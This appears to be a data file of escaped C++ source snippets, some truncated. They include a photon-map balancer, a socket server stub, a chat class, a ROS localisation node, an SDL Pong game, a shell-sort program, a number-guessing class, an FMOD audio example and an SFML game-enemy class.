p[right]->position.getVec3Component(axis);\n\t\tint i = left - 1, j = right;\n\t\tfor(;;) {\n\t\t\twhile(p[++i]->position.getVec3Component(axis) < v);\n\t\t\twhile(p[--j]->position.getVec3Component(axis) > v && j > left);\n\t\t\tif(i >= j)\n\t\t\t\tbreak;\n\t\t\tswap(p, i, j);\n\t\t}\n\t\tswap(p, i, right);\n\t\tif(i >= median)\n\t\t\tright = i -1;\n\t\tif(i <= median)\n\t\t\tleft = i + 1;\n\t}\n}\n\nvoid PhotonMap::balanceSegment(Photon **pBal, Photon **pOrg, const int index, const int start, const int end) {\n\t// Computing new median\n\tint median = 1;\n\twhile((4 * median)  <= (end - start +1)) \n\t\tmedian += median;\n\tif((3 * median) <= (end - start +1)) {\n\t\tmedian += median;\n\t\tmedian += start - 1;\n\t}\n\telse\n\t\tmedian = end - median + 1;\n\t// Find axis to split along\n\tint axis = 2;\n\tif((bboxMax.getVec3Component(0) - bboxMin.getVec3Component(0)) > (bboxMax.getVec3Component(1) - bboxMin.getVec3Component(1)) && \n\t\t(bboxMax.getVec3Component(0) - bboxMin.getVec3Component(0)) > (bboxMax.getVec3Component(2) - bboxMin.getVec3Component(2)))\n\t\taxis = 0;\n\telse if((bboxMax.getVec3Component(1) - bboxMin.getVec3Component(1)) > (bboxMax.getVec3Component(2) - bboxMin.getVec3Component(2)))\n\t\taxis = 1;\n\t// Partition photon block around the median\n\tmedianSplit(pOrg, start, end, median, axis);\n\tpBal[index] = pOrg[median];\n\tpBal[index]->plane = axis;\n\n\t// Recursively balance left and right blocks\n\tif(median > start) {\n\t\t// Balance left segment\n\t\tif(start < median - 1) {\n\t\t\tconst float tmp = bboxMax.getVec3Component(axis);\n\t\t\tbboxMax.setVec3Component(axis, pBal[index]->position.getVec3Component(axis));\n\t\t\tbalanceSegment(pBal, pOrg, 2 * index, start, median - 1);\n\t\t\tbboxMax.setVec3Component(axis, tmp);\n\t\t}\n\t\telse {\n\t\t\tpBal[2 * index] = pOrg[start",
    "#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\n#include <iostream>\n#include <cstring>\n#include <string>\n\n#include \"server.h\"\n\n/*\nserver() notes:\n\n    socket(domain, type, protocol):\n            - domain:\n                specifies comm domiain.\n                AF_INET = IPv4\n                AF_INET6 = IPv6\n                AF_UNIX/AF_LOCAL = local comm\n            - type:\n                type of semantics used for comms.\n                SOCK_STREAM = sequenced, reliable, 2-way comms\n                            corresponds to TCP\n                SOCK_DGRAM  = supports datagrams, connectionless\n                            unreliable of fixed length.\n                            corresponds to UDP\n                SOCK_RAW    = raw network protocol access\n            - protocol:\n                can be used to specify specific protocl.\n                0 for default protocol\n                (if there are multiple protocols for a given\n                domain/type you can specify: \n                    for SOCK_STREAM use IPPROTO_TCP\n                    for SOCK_DGRAM  use IPPROTO_UDP )\n            \n            - return value:\n                -1 for any errors and errno is set\n                non negative integer to represent the file descriptor\n\n\n    perror(string):\n        - string:\n            custom message to appear before the error.\n        \n        perror will respond with a description of the current error\n\n*/\n\nvoid client()\n{\n\n}\n\n\nint main(int argc, char const* argv[])\n{\n    if (argc != 2)\n    {\n        std::cerr << \"usage: \" << argv[0] << \" server|client\" << std::endl;\n        return 1;\n    }\n\n    std::string parameter = argv[1];\n    if (parameter == \"server\")\n    {\n        server();\n    }\n    else if (parameter == \"client\")\n    {\n        client();\n    }\n    else\n    {\n        std::cerr << \"usage: \" << argv[0] << \" server|client\" << std::endl;\n        return 1;\n    }\n    return 0;\n}\n\n",
    "#include \"Chat.h\"\n\nbool Chat::registration(const std::string &login, const std::string &password)\n{\n    if(users.find(login) != users.end()) {\n        std::cout << \"login alredy used\" << std::endl;\n        return false;\n    }\n    users[login] = User(login, password);\n    return true;\n}\n\nbool Chat::sign_in(const std::string &login, const std::string &password)\n{\n    auto it = users.find(login);\n    if(it != users.end() && it->second.checkPassword(password)) {\n        return true;\n    }\n    std::cout << \"sign_in failed\" << std::endl;\n    return false;\n}\n\nvoid Chat::sendMessage(const std::string& sender, const std::string& receiver, const std::string& text) {\n    if (users.find(receiver) != users.end()) {\n        messages.push_back(Message(sender, receiver, text));\n    }\n}\n\nstd::vector<Message> Chat::getMessages(const std::string& username) {\n    std::vector<Message> userMessages;\n    for (const auto& message : messages) {\n        if (message.getReceiver() == username) {\n            userMessages.push_back(message);\n        }\n    }\n    return userMessages;\n}",
    "#include <ros/ros.h>\n#include <nav_msgs/Odometry.h>\n#include <sensor_msgs/JointState.h>\n#include <sensor_msgs/NavSatFix.h>\n#include <tf2_ros/transform_broadcaster.h>\n#include <tf2_geometry_msgs/tf2_geometry_msgs.h>\n#include <visualization_msgs/Marker.h>\n#include <visualization_msgs/MarkerArray.h>\n#include <geometry_msgs/Point.h>\n#include <std_msgs/ColorRGBA.h>\n#include <std_msgs/Float64MultiArray.h>\n#include \"stonefish_ros/BeaconInfo.h\"\n#include <Eigen/Dense>\n#include <unsupported/Eigen/MatrixFunctions>\n\n#include <iostream>\n#include <cmath>\n#include <vector>\n#include <unordered_map>\n\nclass DifferentialDrive {\npublic:\n    DifferentialDrive(double sensor_noise, double sensor_noise_angle)\n        : r_cx(0.5), r_cy(-0.06), r_cz(0.082), r_c_roll(M_PI / 2), r_c_pitch(0.0), r_c_yaw(M_PI / 2),\n          m(1), wheel_radius(0.035), wheel_base_distance(0.23),\n          camera({r_cx, r_cy, r_cz, r_c_roll, r_c_pitch, r_c_yaw}),\n          Xk(Eigen::VectorXd::Zero(10)),\n          lin_vel(0.0), ang_vel(0.0), current_time(0), v(0), w(0),\n          left_wheel_velocity(0.0), right_wheel_velocity(0.0),\n          left_wheel_received(false),\n          last_time(ros::Time::now()),\n          id(0), beacon_list(), rz(0.0),\n          Hk(Eigen::MatrixXd::Zero(3, 10)),\n          F1(Eigen::MatrixXd::Zero(10, 10)),\n          F1_I(Eigen::MatrixXd::Identity(3, 3)),\n          F2(Eigen::MatrixXd::Zero(10, 2)),\n          F2_o(Eigen::MatrixXd::Zero(3, 3)),\n          g1(Eigen::MatrixXd::Zero(10, 7)),\n          g2(Eigen::MatrixXd::Zero(10, 3)),\n          num(0), num_2(0),\n          map12(),\n          Pk_r(Eigen::MatrixXd(4, 4)),\n          Qk(Eigen::MatrixXd(2, 2)),\n          Rk(Eigen::MatrixXd(3, 3)),\n          r_P_c(Eigen::MatrixXd::Zero(6, 6)),\n          Pk(Eigen::MatrixXd::Zero(10, 10)),\n          fv(nullptr),\n          odom_pub(nh.advertise<nav_msgs::Odometry>(\"kobuki/odom\", 10)),\n          marker_pub(nh.advertise<visualization_msgs::MarkerArray>(\"/beacons_viz\", 10)),\n          marker_pub1(nh.advertise<visualization_msgs::Marker>(\"/gps/ellipsoid_marker\", 10)),\n          js_sub(nh.subscribe(\"kobuki/joint_states\", 10, &DifferentialDrive::joint_state_callback, this)),\n          aruco_pose(nh.subscribe(\"/aruco_position\", 10, &DifferentialDrive::aruco_position, this))\n    {\n        Pk_r << std::pow(0.2, 2), 0, 0, 0,\n                0, std::pow(0.2, 2), 0, 0,\n                0, 0, 0.0, 0,\n                0, 0, 0, std::pow(0.05, 2);\n\n        Qk << std::pow(0.2, 2), 0,\n              0, std::pow(0.2, 2);\n\n        Rk << std::pow(0.2, 2), 0, 0,\n              0, std::pow(0.4, 2), 0,\n              0, 0, std::pow(0.4, 2);\n\n        r_P_c.diagonal().setConstant(std::pow(2, 2));\n\n        Pk.topLeftCorner(4, 4) = Pk_r;\n        Pk.block(4, 4, 6, 6) = r_P_c;\n    }\n\n    void transform_r_c(double x, double y, double z, double roll, double pitch, double yaw) {\n        Eigen::Matrix4d Transf = Eigen::Matrix4d::Identity();\n\n        Eigen::Matrix3d Rx;\n        Rx << 1, 0, 0,\n              0, std::cos(roll), -std::sin(roll),\n              0, std::sin(roll), std::cos(roll);\n\n        Eigen::Matrix3d Rz;\n        Rz << std::cos(yaw), -std::sin(yaw), 0,\n              std::sin(yaw), std::cos(yaw), 0,\n              0, 0, 1;\n\n        Eigen::Matrix3d R = Rz * Rx;\n\n        Eigen::Vector3d Trans;\n        Trans << x, y, z;\n\n        Transf.block<3, 3>(0, 0) = R;\n        Transf.block<3, 1>(0, 3) = Trans;\n\n        return Transf;\n    }\n\n    void transform_r_c_inv(double x, double y, double z, double roll, double pitch, double yaw) {\n        Eigen::Matrix4d Transf = Eigen::Matrix4d::Identity();\n\n        Eigen::Matrix3d Rx;\n        Rx << 1, 0, 0,\n              0, std::cos(roll), -std::sin(roll),\n              0, std::sin(roll), std::cos(roll);\n\n        Eigen::Matrix3d Rz;\n        Rz << std::cos(yaw), -std::sin(yaw), 0,\n              std::sin(yaw), std::cos(yaw), 0,\n              0, 0, 1;\n\n        Eigen::Matrix3d R = Rz * Rx;\n\n        Eigen::Vector3d Trans;\n        Trans << x, y, z;\n\n        Eigen::Vector3d Trans_T = -R.transpose() * Trans;\n\n        Transf.block<3, 3>(0, 0) = R.transpose();\n        Transf.block<3, 1>(0, 3) = Trans_T;\n\n        return Transf;\n    }\n\n    double wrap_angle(double ang) {\n        if (ang > M_PI)\n            ang -= 2 * M_PI;\n        return ang;\n    }\n\n    void aruco_position(const std_msgs::Float64MultiArray& beacon) {\n        double c_fx = beacon.data[0];\n        double c_fy = beacon.data[1];\n        double c_fz = beacon.data[2];\n        id = static_cast<int>(beacon.data[3]);\n\n        if (id != 0) {\n            Eigen::Vector3d c_f(c_fx, c_fy, c_fz);\n            double range = std::sqrt(std::pow(c_fx, 2) + std::pow(c_fy, 2) + std::pow(c_fz, 2));\n            double azimuth = std::atan2(c_fy, c_fx);\n            azimuth = wrap_angle(azimuth);\n            double elevation = std::atan2(c_fz, std::sqrt(std::pow(c_fx, 2) + std::pow(c_fy, 2)));\n            elevation = wrap_angle(elevation);\n\n            Eigen::Matrix3d J_p2c;\n            J_p2c << std::cos(elevation) ",
    "#include <SDL2/SDL.h>\n#include <SDL2/SDL_events.h>\n#include <SDL2/SDL_keyboard.h>\n#include <SDL2/SDL_render.h>\n#include <SDL2/SDL_scancode.h>\n#include <SDL2/SDL_surface.h>\n#include <SDL2/SDL_timer.h>\n#include <SDL2/SDL_ttf.h>\n#include <SDL2/SDL_video.h>\n#include <iostream>\n#include <string>\n\n#define WIDTH 720\n#define HEIGHT 720\n#define FONT_SIZE 32\n#define SIZE 16\n#define BALL_SPEED 16\n#define SPEED 9\n#define PI 3.14159265358979323846\n\n#define ONE_PLAYER // comment this for two player \n\nSDL_Renderer* renderer;\nSDL_Window* window;\nTTF_Font *font;\nSDL_Color color;\nbool running;\nint frameCount, timerFPS, lastFrame, fps;\n\nSDL_Rect l_paddle, r_paddle, ball, score_board;\nfloat VelX, VelY;\nstd::string score;\nint l_s, r_s; // score\nbool turn;\n\nvoid serve() {\n  l_paddle.y = r_paddle.y = (HEIGHT/2) - (l_paddle.h/2);\n\n  if(turn) {\n    ball.x = l_paddle.x + (l_paddle.w*4);\n    VelX = BALL_SPEED / 2;\n  } else {\n    ball.x = r_paddle.x - (r_paddle.w*4);\n    VelX = -BALL_SPEED / 2;\n  }\n  VelY = 0;\n  ball.y = HEIGHT/2 - (SIZE/2);\n  turn = !turn;\n}\n\nvoid write(std::string text, int x, int y) {\n  SDL_Surface *surface;\n  SDL_Texture *texture;\n  const char* t = text.c_str();\n  surface = TTF_RenderText_Solid(font, t, color);\n  texture = SDL_CreateTextureFromSurface(renderer, surface);\n  score_board.w = surface->w;\n  score_board.h = surface->h;\n  score_board.x = x - score_board.w;\n  score_board.y = y - score_board.h;\n\n  SDL_FreeSurface(surface);\n  SDL_RenderCopy(renderer, texture, NULL, &score_board);\n  SDL_DestroyTexture(texture);\n}\n\nvoid update() {\n  if(SDL_HasIntersection(&ball, &r_paddle)) {\n    double rel = (r_paddle.y+(r_paddle.h/2))-(ball.y+(SIZE/2));\n    double norm = rel/(r_paddle.h/2);\n    double bounce = norm * (5*PI/12);\n    VelX=-BALL_SPEED*cos(bounce);\n    VelY=BALL_SPEED*-sin(bounce);\n  }\n  if(SDL_HasIntersection(&ball, &l_paddle)) {\n    double rel = (l_paddle.y+(l_paddle.h/2))-(ball.y+(SIZE/2));\n    double norm = rel/(l_paddle.h/2);\n    double bounce = norm * (5*PI/12);\n    VelX=BALL_SPEED*cos(bounce);\n    VelY=BALL_SPEED*-sin(bounce);\n  }\n \n#ifdef ONE_PLAYER // if one player game then move r_paddle automatically based on ball.\n  if(ball.y > r_paddle.y+(r_paddle.h/2)) r_paddle.y+=SPEED;\n  if(ball.y < r_paddle.y+(r_paddle.h/2)) r_paddle.y-=SPEED;\n#endif\n \n  if(ball.x<=0) {r_s++;serve();}\n  if(ball.x+SIZE>=WIDTH) {l_s++;serve();}\n  if(ball.y<=0 || ball.y+SIZE>=HEIGHT) VelY=-VelY;\n  ball.x+=VelX;\n  ball.y+=VelY;\n  score=std::to_string(l_s) + \"   \" + std::to_string(r_s);\n  if(l_paddle.y<0)l_paddle.y=0;\n  if(l_paddle.y+l_paddle.h>HEIGHT)l_paddle.y=HEIGHT-l_paddle.h;\n  if(r_paddle.y<0)r_paddle.y=0;\n  if(r_paddle.y+r_paddle.h>HEIGHT)r_paddle.y=HEIGHT-r_paddle.h;\n}\n\nvoid input() {\n  SDL_Event e;\n  const Uint8 *keystates = SDL_GetKeyboardState(NULL);\n  while(SDL_PollEvent(&e)) if(e.type==SDL_QUIT) running = false;\n  if(keystates[SDL_SCANCODE_ESCAPE]) running = false;\n  \n#ifdef ONE_PLAYER // two player then controll r_paddle with up down\n  if(keystates[SDL_SCANCODE_UP]) l_paddle.y -= SPEED;\n  if(keystates[SDL_SCANCODE_DOWN]) l_paddle.y += SPEED;\n#else  \n  if(keystates[SDL_SCANCODE_W]) l_paddle.y -= SPEED;\n  if(keystates[SDL_SCANCODE_S]) l_paddle.y += SPEED;\n  if(keystates[SDL_SCANCODE_UP]) r_paddle.y -= SPEED;\n  if(keystates[SDL_SCANCODE_DOWN]) r_paddle.y += SPEED;\n#endif\n    \n  \n}\n\nvoid render() {\n  SDL_SetRenderDrawColor(renderer, 0, 0, 0, 255);\n  SDL_RenderClear(renderer);\n  \n  frameCount++;\n  timerFPS = SDL_GetTicks() - lastFrame;\n  if(timerFPS < (1000/60)) {\n    SDL_Delay((1000/60) - timerFPS);\n  }\n\n  SDL_SetRenderDrawColor(renderer, color.r, color.g, color.b, 255);\n  SDL_RenderFillRect(renderer, &l_paddle);\n  SDL_RenderFillRect(renderer, &r_paddle);\n  SDL_RenderFillRect(renderer, &ball);\n  write(score, WIDTH/2+FONT_SIZE, FONT_SIZE*2);\n\n  SDL_RenderPresent(renderer);\n}\n\nint main()\n{\n  if(SDL_Init(SDL_INIT_EVERYTHING) < 0) std::cout << \"Failed at SDL_Init()\" << std::endl;\n  if(SDL_CreateWindowAndRenderer(WIDTH,HEIGHT,0,&window,&renderer) < 0) std::cout << \"Failed at SDL_CreateWindow&Renderer()\" << std::endl;\n  TTF_Init();\n  font = TTF_OpenFont(\"FiraCodeNerdFont-Bold.ttf\", FONT_SIZE);\n\n  running = true;\n  static int lastTime = 0;\n\n  color.g = color.b = color.r = 255;\n  l_s= r_s=0;\n  l_paddle.x = 32; l_paddle.h = HEIGHT/4;\n  l_paddle.y = (HEIGHT/2) - (l_paddle.h/2);\n  l_paddle.w = 12;\n  r_paddle = l_paddle;\n  r_paddle.x = WIDTH - r_paddle.w - 32;\n  ball.w = ball.h = SIZE;\n\n  serve();\n\n  while(running) {\n    lastFrame = SDL_GetTicks();\n    if(lastFrame>=(lastTime + 1000)) {\n      lastTime = lastFrame;\n      fps = frameCount;\n      frameCount = 0;\n    }\n\n    update();\n    input();\n    render();\n  }\n\n  TTF_CloseFont(font);\n  SDL_DestroyRenderer(renderer);\n  SDL_DestroyWindow(window);\n  SDL_Quit();\n  \n  return 0;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nint main() {\r\n    vector<int> A;\r\n    \r\n    \r\n    int main = 1;\r\n    while (main) \r\n    {\r\n        cout << \"*********MENU*********\" << endl;\r\n        cout << \"1.Get data\" << endl;\r\n        cout << \"2.Shell Sort\" << endl;\r\n        cout << \"3.Display\" << endl;\r\n        cout << \"4.Exit\" << endl;\r\n        int ch;\r\n        cout<<\"\\n Enter your Choice:\";\r\n        cin >> ch;\r\n        \r\n        \r\n        if (ch == 1) \r\n        {\r\n            int n;\r\n            cout << \"Enter the Total Number of Element:\";\r\n            cin >> n;\r\n            cout << \"Enter the Element:\" << endl;\r\n            for (int i = 0; i < n; i++) \r\n            {\r\n                int x;\r\n                cin>>x;\r\n                A.push_back(x);\r\n            }\r\n        }\r\n        \r\n        else if (ch == 2) \r\n        {\r\n            int n = A.size();\r\n            int gap = n / 2;\r\n            while (gap > 0) \r\n            {\r\n                for (int s = 0; s < n; s++) \r\n                {\r\n                    for (int i = s + gap; i < n; i += gap) \r\n                    {\r\n                        int minimum = A[i];\r\n                        int j = i - gap;\r\n                        while (j >= 0) \r\n                        {\r\n                            if (A[j] <= minimum) \r\n                            {\r\n                                break;\r\n                            }\r\n                            else \r\n                            {\r\n                                A[j + gap] = A[j];\r\n                                j = j - gap;\r\n                            }\r\n                        }\r\n                        A[j + gap] = minimum;\r\n                    }\r\n                }\r\n                for (int i = 0; i < n; i++) \r\n                {\r\n                    cout << A[i] << \" \";\r\n                }\r\n                cout << endl;\r\n                gap = gap / 2;\r\n            }\r\n        }\r\n        \r\n        \r\n        else if (ch == 3) \r\n        {\r\n            int n = A.size();\r\n            if (n == 0) \r\n            {\r\n                cout << \"Element is Empty\" << endl;\r\n            }\r\n            else \r\n            {\r\n                cout << \"Element are:\" << endl;\r\n                for (int i = 0; i < n; i++) \r\n                {\r\n                    cout << A[i] << \" \";\r\n                }\r\n                cout << endl;\r\n            }\r\n        }\r\n        else if (ch == 4) \r\n        {\r\n            main = 0;\r\n        }\r\n        else \r\n        {\r\n            cout << \"Wrong choice\" << endl;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\nusing namespace std;\n\nstruct GuessResult\n{\n    bool solved;\n    int strikes;\n    int balls;\n};\n\nclass Baseball\n{\npublic:\n    explicit Baseball(const string& question)\n        : question(question)\n    {\n    }\n\n    GuessResult guess(const string& guessNumber)\n    {\n        assertIlligalArgument(guessNumber);\n        if (guessNumber == question)\n        {\n            return { true, 3, 0 };\n        }\n\n        int strikeCnt = getStrikeCnt(guessNumber);\n\n        if (strikeCnt == 2)\n        {\n            return { false, 2, 0 };\n        }\n\n        int ballCnt = getBallCnt(guessNumber);\n\n        if (strikeCnt == 1 && ballCnt == 2)\n        {\n            return { false, 1, 2 };\n        }\n\n        return { false, 0, 0 };\n    }\n\n    void assertIlligalArgument(const string& guessNumber)\n    {\n        if (guessNumber.size() != 3)\n        {\n            throw length_error(\"Must be three letters.\");\n        }\n\n        for (char ch : guessNumber)\n        {\n            if (ch >= '0' && ch <= '9') continue;\n            throw invalid_argument(\"Must be Number.\");\n        }\n\n        if (isDupNumber(guessNumber))\n        {\n            throw invalid_argument(\"Must not have the same Number.\");\n        }\n    }\n    bool isDupNumber(const string& guessNumber)\n    {\n        return (guessNumber[0] == guessNumber[1]) ||\n            (guessNumber[0] == guessNumber[2]) ||\n            (guessNumber[1] == guessNumber[2]);\n    }\n\n    int getStrikeCnt(const string& guessNumber)\n    {\n        int strikeCnt = 0;\n        for (int i = 0; i < guessNumber.size(); i++)\n        {\n            if (guessNumber[i] == question[i])\n            {\n                strikeCnt++;\n            }\n        }\n\n        return strikeCnt;\n    }\n\n    int getBallCnt(const string& guessNumber)\n    {\n        int ballCnt = 0;\n        for (int i = 0; i < guessNumber.size(); i++)\n        {\n            for (int j = 0; j < question.size(); j++)\n            {\n                if (guessNumber[i] == question[j] && i != j)\n                {\n                    ballCnt++;\n                }\n            }\n        }\n\n        return ballCnt;\n    }\n\nprivate:\n    string question;\n};\n",
    "/*==============================================================================\nGapless Playback Example\nCopyright (c), Firelight Technologies Pty, Ltd 2004-2024.\n\nThis example shows how to schedule channel playback into the future with sample\naccuracy.  Use several scheduled channels to synchronize 2 or more sounds.\n\nFor information on using FMOD example code in your own programs, visit\nhttps://www.fmod.com/legal\n==============================================================================*/\n#include \"fmod.hpp\"\n#include \"common.h\"\n\nenum NOTE\n{\n    NOTE_C,\n    NOTE_D,\n    NOTE_E,\n};\n\nNOTE note[] = \n{\n    NOTE_E,   /* Ma-    */\n    NOTE_D,   /* ry     */\n    NOTE_C,   /* had    */\n    NOTE_D,   /* a      */\n    NOTE_E,   /* lit-   */\n    NOTE_E,   /* tle    */\n    NOTE_E,   /* lamb,  */\n    NOTE_E,   /* .....  */\n    NOTE_D,   /* lit-   */\n    NOTE_D,   /* tle    */\n    NOTE_D,   /* lamb,  */\n    NOTE_D,   /* .....  */\n    NOTE_E,   /* lit-   */\n    NOTE_E,   /* tle    */\n    NOTE_E,   /* lamb,  */\n    NOTE_E,   /* .....  */\n\n    NOTE_E,   /* Ma-    */\n    NOTE_D,   /* ry     */\n    NOTE_C,   /* had    */\n    NOTE_D,   /* a      */\n    NOTE_E,   /* lit-   */\n    NOTE_E,   /* tle    */\n    NOTE_E,   /* lamb,  */\n    NOTE_E,   /* its    */\n    NOTE_D,   /* fleece */\n    NOTE_D,   /* was    */\n    NOTE_E,   /* white  */\n    NOTE_D,   /* as     */\n    NOTE_C,   /* snow.  */\n    NOTE_C,   /* .....  */\n    NOTE_C,   /* .....  */\n    NOTE_C,   /* .....  */\n};\n\nint FMOD_Main()\n{\n    FMOD::System           *system;\n    FMOD::Sound            *sound[3];\n    FMOD::Channel          *channel = 0;\n    FMOD::ChannelGroup     *channelgroup = 0;\n    FMOD_RESULT             result;\n    unsigned int            dsp_block_len, count;\n    int                     outputrate = 0;\n    void                   *extradriverdata = 0;\n    \n    Common_Init(&extradriverdata);\n\n    /*\n        Create a System object and initialize.\n    */\n    result = FMOD::System_Create(&system);\n    ERRCHECK(result);\n    \n    result = system->init(100, FMOD_INIT_NORMAL, extradriverdata);\n    ERRCHECK(result);\n\n    /*\n        Get information needed later for scheduling.  The mixer block size, and the output rate of the mixer.\n    */\n    result = system->getDSPBufferSize(&dsp_block_len, 0);\n    ERRCHECK(result);\n\n    result = system->getSoftwareFormat(&outputrate, 0, 0);\n    ERRCHECK(result);\n\n    /*\n        Load 3 sounds - these are just sine wave tones at different frequencies.  C, D and E on the musical scale.\n    */\n    result = system->createSound(Common_MediaPath(\"c.ogg\"), FMOD_DEFAULT, 0, &sound[NOTE_C]);\n    ERRCHECK(result);\n    result = system->createSound(Common_MediaPath(\"d.ogg\"), FMOD_DEFAULT, 0, &sound[NOTE_D]);\n    ERRCHECK(result);\n    result = system->createSound(Common_MediaPath(\"e.ogg\"), FMOD_DEFAULT, 0, &sound[NOTE_E]);\n    ERRCHECK(result);\n\n    /* \n        Create a channelgroup that the channels will play on.  We can use this channelgroup as our clock reference. \n        It also means we can pause and pitch bend the channelgroup, without affecting the offsets of the delays, because the channelgroup clock\n        which the channels feed off, will be pausing and speeding up/slowing down and still keeping the children in sync.\n    */\n    result = system->createChannelGroup(\"Parent\", &channelgroup);\n    ERRCHECK(result);\n\n    unsigned int numsounds = sizeof(note) / sizeof(note[0]);\n\n    /*\n        Play all the sounds at once! Space them apart with set delay though so that they sound like they play in order.\n    */\n    for (count = 0; count < numsounds; count++)\n    {\n        static unsigned long long clock_start = 0;\n        unsigned int slen;\n        FMOD::Sound *s = sound[note[count]];                            /* Pick a note from our tune. */\n\n        result = system->playSound(s, channelgroup, true, &channel);    /* Play the sound on the channelgroup we want to use as the parent clock reference (for setDelay further down) */\n        ERRCHECK(result);\n\n        if (!clock_start)\n        {\n            result = channel->getDSPClock(0, &clock_start);\n            ERRCHECK(result);\n\n            clock_start += (dsp_block_len * 2);                         /* Start the sound into the future, by 2 mixer blocks worth. */\n                                                                        /* Should be enough to avoid the mixer catching up and hitting the clock value before we've finished setting up everything. */\n                                                                        /* Alternatively the channelgroup we're basing the clock on could be paused to stop it ticking. */\n        }\n        else\n        {\n            float freq;\n\n            result = s->getLength(&slen, FMOD_TIMEUNIT_PCM);            /* Get the length of the sound in samples. */\n            ERRCHECK(result);\n\n            result = s->getDefaults(&freq, 0);                          /* Get the default frequency that the sound was recorded at. */\n            ERRCHECK(resul",
    "#include \"NightBorn.h\"\n\nNightBorn::NightBorn(const sf::Vector2u &windowSize, float x, float y) :\n        windowSize(windowSize),\n        speedOfWalk(1.9f),\n        timeSinceLastFrameIdle(0.f),\n        timeSinceLastFrameWalk(0.f),\n        timeSinceLastFrameAttack(0.f),\n        timeSinceLastFrameDead(0.f),\n        timeSinceLastFrameHit(0.f),\n        player(nullptr)\n{\n    lastAttackTime = attackCooldown;\n    attackReady = true;\n    clock.restart();\n\n    if (!idleTexture.loadFromFile(\"../Enemies/nightBorn/Idle.png\"))\n        fmt::println(\"Failed to load idle texture\");\n    if (!walkTexture.loadFromFile(\"../Enemies/nightBorn/Walk.png\"))\n        fmt::println(\"Failed to load walk texture\");\n    if (!attackTexture.loadFromFile(\"../Enemies/nightBorn/Attack.png\"))\n        fmt::println(\"Failed to load attack texture\");\n    if (!deadTexture.loadFromFile(\"../Enemies/nightBorn/Death.png\"))\n        fmt::println(\"Failed to load death texture\");\n    if (!hitTexture.loadFromFile(\"../Enemies/nightBorn/Hit.png\"))\n        fmt::println(\"Failed to load hit texture\");\n\n    if (!walkFlippedTexture.loadFromFile(\"../Enemies/nightBorn/WalkFlipped.png\"))\n        fmt::println(\"Failed to load walkHorizontal texture\");\n    if (!attackFlippedTexture.loadFromFile(\"../Enemies/nightBorn/AttackFlipped.png\"))\n        fmt::println(\"Failed to load attackFlipped texture\");\n    if (!idleFlippedTexture.loadFromFile(\"../Enemies/nightBorn/IdleFlipped.png\"))\n        fmt::println(\"Failed to load attackFlipped texture\");\n\n    //Wizard\n    this->sprite.setTexture(idleTexture);\n    this->sprite.setPosition(x, y);\n    this->sprite.setScale(-3.4f, 3.4f);\n\n    //frame\n    this->initFrames();\n\n    fmt::println(\"NightBorn is initiated.\");\n}\n\n//frames into vector\nvoid NightBorn::initFrames() {\n    fillFrameVector(idleTexture, idleFrames, 9);\n    fillFrameVector(walkTexture, walkFrames, 6);\n    fillFrameVector(walkTexture, walkFlippedFrames, 6);\n    fillFrameVector(hitTexture, hitFrames, 5);\n    fillFrameVector(deadTexture, deadFrames, 23);\n    fillFrameVector(attackTexture, attackFrames, 12);\n    fillFrameVector(attackFlippedTexture, attackFlippedFrames, 12);\n    fillFrameVector(idleFlippedTexture, idleFlippedFrames, 9);\n    std::ranges::reverse(attackFlippedFrames);\n    std::ranges::reverse(walkFlippedFrames);\n    std::ranges::reverse(idleFlippedFrames);\n}\nvoid NightBorn::fillFrameVector(sf::Texture &texture, std::vector<sf::IntRect> &frameVector, int framesCount) {\n    sf::Vector2u textureSize = texture.getSize();\n    int frameWidth = textureSize.x / framesCount;\n    for (int i = 0; i < framesCount; ++i) {\n        frameVector.emplace_back(i * frameWidth, 0, frameWidth, textureSize.y);\n    }\n}\n\n//animations\nvoid NightBorn::updateAnimation(float dt) {\n    updateIdleAnimation(dt);\n    updateWalkAnimation(dt);\n    updateAttackAnimation(dt);\n    updateHitAnimation(dt);\n    updateDeadAnimation(dt);\n}\nvoid NightBorn::updateIdleAnimation(float dt) {\n    if(!isMoving && !isAttacking && !isDead && !isHit) {\n        this->timeSinceLastFrameIdle += dt;\n        if (this->timeSinceLastFrameIdle >= this->animationSpeed) {\n            if (isFlipped) {\n                this->sprite.setTexture(this->idleFlippedTexture);\n                this->idleFrame = (this->idleFrame + 1) % this->idleFlippedFrames.size();\n                this->sprite.setTextureRect(this->idleFlippedFrames[this->idleFrame]);\n            } else {\n                this->sprite.setTexture(this->idleTexture);\n                this->idleFrame = (this->idleFrame + 1) % this->idleFrames.size();\n                this->sprite.setTextureRect(this->idleFrames[this->idleFrame]);\n            }\n            this->timeSinceLastFrameIdle -= this->animationSpeed;\n        }\n    }\n}\nvoid NightBorn::updateWalkAnimation(float dt) {\n    if(isMoving && !isAttacking && !isDead) {\n        this->timeSinceLastFrameWalk += dt;\n        if (this->timeSinceLastFrameWalk >= this->walkAnimationSpeed) {\n            if (isFlipped) {\n                this->sprite.setTexture(this->walkFlippedTexture);\n            } else {\n                this->sprite.setTexture(this->walkTexture);\n            }\n            this->timeSinceLastFrameWalk -= this->walkAnimationSpeed;\n            this->walkFrame = (this->walkFrame + 1) % this->walkFrames.size();\n            this->sprite.setTextureRect(this->walkFrames[this->walkFrame]);\n        }\n    }\n}\nvoid NightBorn::updateDeadAnimation(float dt) {\n    if(isDead && !isDeadAnimationPlayed) {\n        this->timeSinceLastFrameDead += dt;\n        if (this->timeSinceLastFrameDead >= this->deadSpeed) {\n            this->sprite.setTexture(this->deadTexture);\n            this->timeSinceLastFrameDead -= this->deadSpeed;\n\n            // This part achieves a similar function as to the Player class\n            this->deadFrame = (this->deadFrame + 1);\n\n            // Check if we have more frames to go through\n            if (this->deadFrame < this->deadFrames.size()) {\n                this->sprite.setTextureRect(this->deadFrames[this",
